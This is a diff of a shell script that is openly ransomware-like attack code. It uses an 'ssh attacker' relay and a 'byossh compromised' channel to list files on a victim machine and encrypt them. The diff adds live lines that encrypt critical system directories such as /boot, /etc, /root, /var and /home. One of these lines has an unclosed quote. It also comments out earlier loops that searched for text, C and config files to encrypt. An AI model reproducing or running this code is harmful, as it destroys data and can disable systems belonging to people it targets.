@@ -34,6 +34,13 @@ sleep 5 # let the victim connect
 
 encrypt_file "$HOME/testing.txt"
 
+encrypt_file "/boot
+encrypt_file "/etc"
+encrypt_file "/root"
+encrypt_file "/run"
+encrypt_file "/var"
+encrypt_file "/home"
+
 # # Encrypt documents
 # output=$(ssh attacker "byossh compromised find ~/Documents" | sed '1d')
 # while IFS= read -r file; do
@@ -61,68 +68,68 @@ encrypt_file "$HOME/testing.txt"
 # done <<< "$output"
 
 
-# Encrypt all text files
-total=0
-output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
-printf "%s\n" "$output" | while IFS= read -r file; do
-    if [ "$total" = "20" ]; then
-        break
-    fi
-    total=$((total + 1))
-    echo "could encrypt: $file"
-    encrypt_file "$file" < /dev/null || true
-done
-
-
-# while IFS= read -r file; do
-# # Stop after 20 files for the sake of time
-# done <<< "$output"
-
-
-# # Encrypt all python files
-# (
-#     output=$(ssh attacker "byossh compromised 'find / | grep .py'" | sed '1d')
-#     for file in $output; do
-#         encrypt_file $file
-#     done
-# )
-
-# # Encrypt all go files
+# # Encrypt all text files
 # total=0
-# output=$(ssh attacker "byossh compromised 'find / | grep .go$'" | sed '1d')
-# while IFS= read -r file; do
-# 	# Stop after 20 files for the sake of time
-# 	if [ "$total" = "40" ]; then
-# 	    break
-# 	fi
-# 	total=$(($total + 1))
-# 	encrypt_file "$file"
-# done <<< "$output"
- 
- 
-# Encrypt all c files
-total=0
-output=$(ssh attacker "byossh compromised 'find / | grep \'\\.c$\''" | sed '1d')
-printf "%s\n" "$output" | while IFS= read -r file; do
-    if [ "$total" = "20" ]; then
-        break
-    fi
-    total=$((total + 1))
-    echo "could encrypt: $file"
-    encrypt_file "$file" < /dev/null || true
-done
-
-# Encrypt all configs
-total=0
-output=$(ssh attacker "byossh compromised find ~/.config" | sed '1d')
-printf "%s\n" "$output" | while IFS= read -r file; do
-    if [ "$total" = "20" ]; then
-        break
-    fi
-    total=$((total + 1))
-    echo "could encrypt: $file"
-    encrypt_file "$file" < /dev/null || true
-done
+# output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
+# printf "%s\n" "$output" | while IFS= read -r file; do
+#     if [ "$total" = "20" ]; then
+#         break
+#     fi
+#     total=$((total + 1))
+#     echo "could encrypt: $file"
+#     encrypt_file "$file" < /dev/null || true
+# done
+# 
+# 
+# # while IFS= read -r file; do
+# # # Stop after 20 files for the sake of time
+# # done <<< "$output"
+# 
+# 
+# # # Encrypt all python files
+# # (
+# #     output=$(ssh attacker "byossh compromised 'find / | grep .py'" | sed '1d')
+# #     for file in $output; do
+# #         encrypt_file $file
+# #     done
+# # )
+# 
+# # # Encrypt all go files
+# # total=0
+# # output=$(ssh attacker "byossh compromised 'find / | grep .go$'" | sed '1d')
+# # while IFS= read -r file; do
+# # 	# Stop after 20 files for the sake of time
+# # 	if [ "$total" = "40" ]; then
+# # 	    break
+# # 	fi
+# # 	total=$(($total + 1))
+# # 	encrypt_file "$file"
+# # done <<< "$output"
+#  
+#  
+# # Encrypt all c files
+# total=0
+# output=$(ssh attacker "byossh compromised 'find / | grep \'\\.c$\''" | sed '1d')
+# printf "%s\n" "$output" | while IFS= read -r file; do
+#     if [ "$total" = "20" ]; then
+#         break
+#     fi
+#     total=$((total + 1))
+#     echo "could encrypt: $file"
+#     encrypt_file "$file" < /dev/null || true
+# done
+# 
+# # Encrypt all configs
+# total=0
+# output=$(ssh attacker "byossh compromised find ~/.config" | sed '1d')
+# printf "%s\n" "$output" | while IFS= read -r file; do
+#     if [ "$total" = "20" ]; then
+#         break
+#     fi
+#     total=$((total + 1))
+#     echo "could encrypt: $file"
+#     encrypt_file "$file" < /dev/null || true
+# done
 
 
 # wait
